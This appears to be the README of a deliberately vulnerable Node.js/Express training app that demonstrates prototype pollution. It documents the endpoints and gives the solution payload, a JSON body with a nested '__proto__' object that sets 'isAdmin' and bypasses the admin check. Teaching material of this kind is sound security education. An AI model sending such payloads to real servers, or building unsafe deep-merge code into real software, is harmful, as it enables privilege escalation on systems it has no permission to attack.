# User Details API

A simple Node.js app with Express that allows users to update their details, including a deeply merged address object.

This app demonstrates the prototype pollution vulnerability.

Your goal is to hack the server and get the message "You were hacked!".
You can see the solution under the `POST /update-details` section.

## Setup

1. Install dependencies:
   ```bash
   npm install
   ```
2. Start the server:
   ```bash
   npm start
   ```

## API

### GET /user-details

Fetch the most recent user's details.

**Response:**
```
{
    "userDetails": {
        "name": "",
        "age": 0,
        "address": {
            "address_line_1": {
                "street": ""
            },
            "address_line_2": {
                "building_name": "",
                "unit_number": "",
                "floor_number": "",
                "room_number": ""
            },
            "city": "",
            "state": "",
            "zip": ""
        }
    }
}
```

### POST /update-details

Regular post request to update the user's details:

**Request:**
```
{
  "name": "John Doe",
  "age": 30,
  "address": {
    "address_line_1": {
      "street": "123 Main Street"
    },
    "address_line_2": {
        "unit_number": "204",
        "floor_number": "2",
        "room_number": "04"

    },
    "city": "New York",
    "state": "NY",
    "zip": "10001"
  }
}
```

If you want to hack the server, you can do so by sending the following request (note the additional `__proto__` attribute):

```
{
  "name": "John Doe",
  "age": 30,
  "address": {
    "address_line_1": {
      "street": "123 Main Street"
    },
    "address_line_2": {
        "unit_number": "204",
        "floor_number": "2",
        "room_number": "04"

    },
    "city": "New York",
    "state": "NY",
    "zip": "10001",
    "__proto__": {"isAdmin": true}
  }
}
```

### GET /is-admin

Check if user is admin by creating an empty dictionary and checking the isAdmin attribute.

This is the response when the user is not admin:
```
{
  "message": "User is not admin"
}
```

Once you hack the server, the response will be:
```
{
  "message": "You were hacked!"
}
```
